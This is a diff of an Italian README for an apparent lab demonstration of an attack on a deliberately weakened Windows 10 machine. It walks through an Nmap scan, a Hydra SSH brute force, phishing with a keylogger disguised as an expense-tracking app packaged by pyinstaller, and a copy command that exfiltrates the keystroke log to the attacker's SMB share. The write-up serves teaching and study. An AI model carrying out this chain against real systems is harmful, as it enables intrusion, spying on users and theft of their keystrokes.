@@ -35,8 +35,8 @@ Affinche l'applicazione fosse compatibile con il sistema Windows 10, ho dovuto u
 Windows 10 ha richiesto delle configurazioni particolari prima di essere utilizzato:
 
 + La disattivazione del firewall e della scansione in tempo reale.
-+ Modifiche riguardo i privilegi dell'utente: utilizzando una utility di Windows di nome secpol.msc accedibile attraverso prompt dei comandi come amministratore e modificando la sezione riguardante "Criteri Locali"->"Assegnazioni Diritti Utente". 
-+ Attivazione dei Servizi SSH e SMB, fatta tramite "Impostazioni"->"Funzionalità Facoltative".
++ Modifiche riguardo i privilegi dell'utente: utilizzando una utility di Windows di nome secpol.msc accedibile attraverso prompt dei comandi come amministratore e modificando la sezione riguardante **"Criteri Locali"->"Assegnazioni Diritti Utente"**. 
++ Attivazione dei Servizi SSH e SMB, fatta tramite **"Impostazioni"->"Funzionalità Facoltative"**.
 + Per permettere a Windows 10 di rispondere ai ping e consentire la scansione con Nmap da un altro computer c'è stato bisogno di modificare le impostazioni riguardo le connessioni in entrata accedendo a Windows Defender Firewall e modificando la regole riguardanti ICMP Echo Request e TCP/UDP.
 
 ### 4. Note sulla demo
@@ -49,7 +49,7 @@ La demo non comprende le modifiche delle configurazioni relative ai sistemi oper
 
 ---
 
-Sono interessata a un'azienda del settore finanziario, sono sulla stessa rete e conosco l'indirizzo IP 10.0.2.4 di un dispositivo aziendale. A questo punto procedo con la scansione di 10.0.2.4 utilizzando Nmap con l'opzione -sV (Nmap tenta di identificare quali servizi sono attivi sulle porte e quali versioni specifiche di quei servizi sono in uso):
+Sono interessata a un'azienda del settore finanziario, sono sulla stessa rete e conosco l'indirizzo IP **10.0.2.4** di un dispositivo aziendale. A questo punto procedo con la scansione di **10.0.2.4** utilizzando Nmap con l'opzione -sV (Nmap tenta di identificare quali servizi sono attivi sulle porte e quali versioni specifiche di quei servizi sono in uso):
 
 ![Descrizione immagine](./images/enumer_nmap.png)
 
@@ -61,7 +61,7 @@ L'output rivela che l'azienda ha configurato una device Windows in cui sono atti
 
 ---
 
-Dopo aver identificato i servizi SSH e SMB attivi sul dispositivo, procedo con l'utilizzo di Hydra per effettuare un attacco di forza bruta contro il servizio SSH all'indirizzo IP 10.0.2.4 e ottenere accesso ai sistemi. Uso le opzioni -L e -P per specificare rispettivamente due dizionari, che mi sono costruita, di nomi utenti User e di password Password per trovare le credenziali del servizio SSH.
+Dopo aver identificato i servizi SSH e SMB attivi sul dispositivo, procedo con l'utilizzo di Hydra per effettuare un attacco di forza bruta contro il servizio SSH all'indirizzo IP **10.0.2.4** e ottenere accesso ai sistemi. Uso le opzioni -L e -P per specificare rispettivamente due dizionari, che mi sono costruita, di nomi utenti User e di password Password per trovare le credenziali del servizio SSH.
 
 ![Descrizione immagine](./images/hydra.png)
 
@@ -69,10 +69,10 @@ Scopro l'uso di credenziali predefinite da parte dell'amministratore, e procedo 
 
 ![Descrizione immagine](./images/Inizio_SSH.png)
 
-Ottengo l'accesso alla shell nel dispositivo dell'azienda e, con il comando whoami, verifica l'identità della shell (che è quella dell'amministratore). 
+Ottengo l'accesso alla shell nel dispositivo dell'azienda e, con il comando whoami, verifica l'identità della shell (che è quella dell'amministratore).
 
 Effettuo una navigazione tra i file e scopro la presenza di un altro utente: Alessandro.
-Nella sua cartella Documents, trovo un file di nome "biglietto da visita", lo apro e trovo le informazioni di contatto di Alessandro come il nome completo e la mail. 
+Nella sua cartella Documents, trovo un file di nome "biglietto da visita", lo apro e trovo le informazioni di contatto di Alessandro come il nome completo e la mail.
 
 ![Descrizione immagine](./images/Bigl_da_visita.png)
 
@@ -87,7 +87,7 @@ Faccio una ricerca sui social media e scopro che Alessandro è un grande appassi
 ### 1. Programmazione del Keylogger e dell'interfaccia grafica del gestore
 
 Ho programmato il "Gestore di spesa" con Python e nel codice sorgente ho inserito il keylogger (utilizzando la piattaforma Visual Code Studio [8]).
-Ho utilizzato la libreria Tkinter di Python per la creazione dell'interfaccia grafica relativa allo script. Per come è strutturata l'applicazione, alla chiusura della finestra, il Keylogger si attiva, registra tutti i tasti premuti da alessandro e li salva in un file di nome "log.txt" nella cartella "C:\Windows\Temp" da me scelta. La scelta della cartella è stata arbitraria, potevo scegliere qualsiasi altro percorso. Il codice sottostante rappresenta l'applicazione completa e funzionante del "Gestore di spesa", la parte evidenziata dal quadrato rosso rappresenta solo il codice del keylogger:
+Ho utilizzato la libreria Tkinter di Python per la creazione dell'interfaccia grafica relativa allo script. Per come è strutturata l'applicazione, alla chiusura della finestra, il Keylogger si attiva, registra tutti i tasti premuti da alessandro e li salva in un file di nome **"log.txt"** nella cartella **"C:\Windows\Temp"** da me scelta. La scelta della cartella è stata arbitraria, potevo scegliere qualsiasi altro percorso. Il codice sottostante rappresenta l'applicazione completa e funzionante del **"Gestore di spesa"**, la parte evidenziata dal quadrato rosso rappresenta solo il codice del keylogger:
 
 ```python
 
@@ -203,13 +203,13 @@ if __name__ == "__main__":
 
 ```
 
-Ho salva lo script in formato .pyw perchè questa estensione permette di eseguire il programma senza aprire una finestra di console separata. Alla fine della programmazione trasformo lo script da .py a .exe sfruttando la libreria pyinstaller; essa prende lo script Python e genera un singolo file eseguibile che contiene tutte le dipendenze necessarie, inoltre, può essere eseguito su computer con Python non installato. Ho scelto una icona a mio piacimento e l'ho converte in .ico (attraverso un sito web [9]), dopo aver caricato la libreria pyinstaller sul sistema, eseguo il seguente comando: 
+Ho salva lo script in formato **.pyw** perchè questa estensione permette di eseguire il programma senza aprire una finestra di console separata. Alla fine della programmazione trasformo lo script da .pyw a .exe sfruttando la libreria pyinstaller; essa prende lo script Python e genera un singolo file eseguibile che contiene tutte le dipendenze necessarie, inoltre, può essere eseguito su computer con Python non installato. Ho scelto una icona a mio piacimento e l'ho converte in .ico (attraverso un sito web [9]), dopo aver caricato la libreria pyinstaller sul sistema, eseguo il seguente comando:
 
 ```shell
-pyinstaller --onefile --icon=Icona.ico Gestore_di_spesa.py
+pyinstaller --onefile --icon=Icona.ico Gestore_di_spesa.pyw
 ```
 
-Questo comando creerà nella directory che ho scelto il file Gestore_di_spesa.exe con l'immagine Icona.ico da me scelta. Successivamente ho cambiato il nome dell'eseguibile in "Manager Spesa".
+Questo comando creerà nella directory che ho scelto il file **"Gestore_di_spesa.exe"** con l'immagine Icona.ico da me scelta. Successivamente ho cambiato il nome dell'eseguibile in **"Manager Spesa"**.
 
 L'eseguibile lo invio mia e-mail (attraverso Drive a causa della grandezza del file) con il corpo citato prima.
 
@@ -244,11 +244,11 @@ Il Team di Gestore di Spesa
 
 </blockquote>
 
-Alessandro accede alla sua casella di posta, e legge la mail proviente dal team di Gestore Spese. Interessato all'opportunità decide di fare il download dell'allegato all'e-mail. Il file in questione si presenta con il nome di "Manager spesa.exe" che è il file malevolo creato da me (l'attaccante).
+Alessandro accede alla sua casella di posta, e legge la mail proviente dal team di Gestore Spese. Interessato all'opportunità decide di fare il download dell'allegato all'e-mail. Il file in questione si presenta con il nome di **"Manager spesa.exe"** che è il file malevolo creato da me (l'attaccante).
 
 ### 3. Funzionamento del Software Malevolo
 
-Alessandro scarica e avvia il programma "Manager spesa.exe". Il programma si presenta come una legittima applicazione di gestione delle spese, consentendo all'utente di inserire e monitorare entrate e uscite.
+Alessandro scarica e avvia il programma **"Manager spesa.exe"**. Il programma si presenta come una legittima applicazione di gestione delle spese, consentendo all'utente di inserire e monitorare entrate e uscite.
 
 ![Descrizione immagine](./images/Gestore.png)
 
@@ -280,7 +280,7 @@ Questo comando crea una condivisione SMB denominata hax nella directory da me sc
 
 ### 2. Navigazione sulla Macchina della Vittima
 
-Attraverso il protocollo SSH (scoperto precedentenente attivo sul dispositivo bersaglio con le relative credenziali valide), verifico la posizione del file log.txt generato dal keylogger. Il file è collocato nella directory C:\Windows\temp per costruzione del keylogger.
+Attraverso il protocollo SSH (scoperto precedentenente attivo sul dispositivo bersaglio con le relative credenziali valide), verifico la posizione del file **"log.txt"** generato dal keylogger. Il file è collocato nella directory **"C:\Windows\temp"** per costruzione del keylogger.
 
 ![Descrizione immagine](./images/Temp.png)
 
@@ -294,13 +294,13 @@ copy C:\Windows\temp\log.txt \\10.0.2.15\hax\log.txt
 
 ![Descrizione immagine](./images/Dopocopia.png)
 
-Dove 10.0.2.15 è l'indirizzo IP del mio dispositivo.
+Dove **10.0.2.15** è l'indirizzo IP del mio dispositivo.
 
 Posso verificare che lo spostamento del file è avvenuto nel terminale che ha usato per creare la condivisione SMB:
 
 ![Descrizione immagine](./images/verificata_connessione.png)
 
-Esempio del file log.txt ottenuto:
+Esempio del file "log.txt" ottenuto:
 
 ![Descrizione immagine](./images/log.txt.png)
 
